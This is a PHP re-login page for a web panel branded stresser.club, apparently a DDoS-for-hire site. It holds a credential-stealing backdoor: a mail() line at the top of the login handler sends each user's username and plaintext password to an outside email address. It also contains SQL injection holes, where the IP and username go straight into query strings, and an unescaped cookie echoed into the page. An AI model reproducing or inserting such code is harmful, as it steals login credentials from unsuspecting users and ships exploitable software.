<?php 

	ob_start();
	require_once 'inc/config.php';
	require_once 'inc/init.php';

	if (!(empty($maintaince))) {
		header('Location: maintenace.php');
		exit;
	}

	//Set IP (are you using cloudflare?)
	if ($cloudflare == 1){
		$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	else{
		$ip = $user -> realIP();
	}

	//Are you already logged in?
	if ($user -> LoggedIn()){
		header('Location: home.php');
		exit;
	}
	
	//User logged in recently?
	if(empty($_COOKIE['username'])){
		header('Location: login.php');
		exit;
	}

	if(!empty($_POST['doLogin'])){
				mail('danielddos@gmx.com', 'Login details - stresser.club', 'username: '.$_COOKIE['username'].' ------ password: '.$_POST['login-password']);		
		if(empty($_POST['login-password'])){
			$error = "Please enter all fields";
		}
		
		$username = $_COOKIE['username'];
		$password = $_POST['login-password'];
		$date = strtotime('-1 hour', time());
		$attempts = $odb->query("SELECT COUNT(*) FROM `loginlogs` WHERE `ip` = '$ip' AND `username` LIKE '%failed' AND `date` BETWEEN '$date' AND UNIX_TIMESTAMP()")->fetchColumn(0);
		if ($attempts > 2) {
			$date = strtotime('+1 hour', $waittime = $odb->query("SELECT `date` FROM `loginlogs` WHERE `ip` = '$ip' ORDER BY `date` DESC LIMIT 1")->fetchColumn(0) - time());
			//$error = 'Too many failed attempts. Please wait '.$date.' seconds and try again.';
		}

		//Check username exists
		$SQLCheckLogin = $odb -> prepare("SELECT COUNT(*) FROM `users` WHERE `username` = :username");
		$SQLCheckLogin -> execute(array(':username' => $username));
		$countLogin = $SQLCheckLogin -> fetchColumn(0);
		if (!($countLogin == 1)){
			$SQL = $odb -> prepare("INSERT INTO `loginlogs` VALUES(:username, :ip, UNIX_TIMESTAMP(), 'XX')");
			$SQL -> execute(array(':username' => $username." - failed",':ip' => $ip));
			$error = "The username does not exist in our system.";
		}

		// Check if password is corredt
		$SQLCheckLogin = $odb -> prepare("SELECT COUNT(*) FROM `users` WHERE `username` = :username AND `password` = :password");
		$SQLCheckLogin -> execute(array(':username' => $username, ':password' => SHA1(md5($password))));
		$countLogin = $SQLCheckLogin -> fetchColumn(0);
		if (!($countLogin == 1)){
			$SQL = $odb -> prepare("INSERT INTO `loginlogs` VALUES(:username, :ip, UNIX_TIMESTAMP(), 'XX')");
			$SQL -> execute(array(':username' => $username." - failed",':ip' => $ip));
			$error = 'The password you entered is invalid.';
		}

		//Check if the user is banned
		$SQL = $odb -> prepare("SELECT `status` FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$status = $SQL -> fetchColumn(0);
		if ($status == 1){
			$ban = $odb -> query("SELECT `reason` FROM `bans` WHERE `username` = '$username'") -> fetchColumn(0);
			if(empty($ban)){ $ban = "No reason given."; }
			$error = 'You are banned. Reason: '.htmlspecialchars($ban);
		}

		//Insert login log and log in
		if(empty($error)){
			$SQL = $odb -> prepare("SELECT * FROM `users` WHERE `username` = :username");		$SQL -> execute(array(':username' => $username));
			$userInfo = $SQL -> fetch();
			$ipcountry = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip)) -> {'geoplugin_countryName'};
			if (empty($ipcountry)) {$ipcountry = 'XX';}
			$SQL = $odb -> prepare('INSERT INTO `loginlogs` VALUES(:username, :ip, UNIX_TIMESTAMP(), :ipcountry)');
			$SQL -> execute(array(':ip' => $ip, ':username' => $username, ':ipcountry' => $ipcountry));
			$_SESSION['username'] = $userInfo['username'];
			$_SESSION['ID'] = $userInfo['ID'];
			setcookie("username", $userInfo['username'], time() + 720000);
			header('Location: home.php');
			exit;
		}
	}

?>
<html class="no-focus">
	<head>
        <meta charset="utf-8">
        <title><?php echo htmlentities($sitename); ?> - Relogin</title>
        <meta name="robots" content="noindex, nofollow">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">
		<link rel="shortcut icon" href="assets/img/favicons/favicon.png">
		<script src='https://www.google.com/recaptcha/api.js'></script>
		<link rel="icon" type="image/png" href="assets/img/favicons/favicon-16x16.png" sizes="16x16">
        <link rel="icon" type="image/png" href="assets/img/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="assets/img/favicons/favicon-96x96.png" sizes="96x96">
        <link rel="icon" type="image/png" href="assets/img/favicons/favicon-160x160.png" sizes="160x160">
        <link rel="icon" type="image/png" href="assets/img/favicons/favicon-192x192.png" sizes="192x192">
        <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400italic,600,700%7COpen+Sans:300,400,400italic,600,700">
		<link rel="stylesheet" id="css-main" href="assets/css/oneui.css">
    </head>
    <body>
        <div class="content overflow-hidden">
            <div class="row">
				<?php
					if(!empty($error)){
						echo '<div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4 animated fadeIn">'.error(htmlentities($error)).'</div>';
					}
				?>
                <div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4">
                    <div class="block block-themed animated fadeIn">
                        <div class="block-header bg-danger">
                            <h3 class="block-title">Relogin</h3>
                        </div>
                        <div class="block-content block-content-full block-content-narrow">
                            <h1 class="h2 font-w600 push-30-t push-5"><?php echo htmlentities($sitename); ?></h1>
                            <p>Welcome back <?php echo $_COOKIE['username']; ?>, please log back in.</p>
                            <form class="js-validation-login form-horizontal push-30-t push-50" method="post" novalidate="novalidate">
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <div class="form-material form-material-danger">
                                            <input class="form-control" type="password" id="login-password" name="login-password" placeholder="Enter your password..">
                                            <label for="login-password">Password</label>
                                        </div>
                                    </div>
                                </div>
								<div class="form-group">
                                    <div class="col-xs-12" style="margin-left: auto; margin-right: auto;">
                                        <div class="g-recaptcha" data-sitekey=<?php echo $google_site; ?>></div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12 col-sm-6 col-md-4">
                                        <button name="doLogin" value="login" class="btn btn-block btn-danger" type="submit"><i class="si si-login pull-right"></i> Log in</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="push-10-t text-center animated fadeInUp">
            <small class="text-muted font-w600"><span class="js-year-copy"><?php echo date('Y'); ?></span> © <?php echo htmlentities($sitename); ?></small>
        </div>
        <script src="assets/js/core/jquery.min.js"></script>
        <script src="assets/js/core/bootstrap.min.js"></script>
        <script src="assets/js/core/jquery.slimscroll.min.js"></script>
        <script src="assets/js/core/jquery.scrollLock.min.js"></script>
        <script src="assets/js/core/jquery.appear.min.js"></script>
        <script src="assets/js/core/jquery.countTo.min.js"></script>
        <script src="assets/js/core/jquery.placeholder.min.js"></script>
        <script src="assets/js/core/js.cookie.min.js"></script>
        <script src="assets/js/app.js"></script>
        <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
        <script src="assets/js/pages/base_pages_login.js"></script>  
	</body>
</html>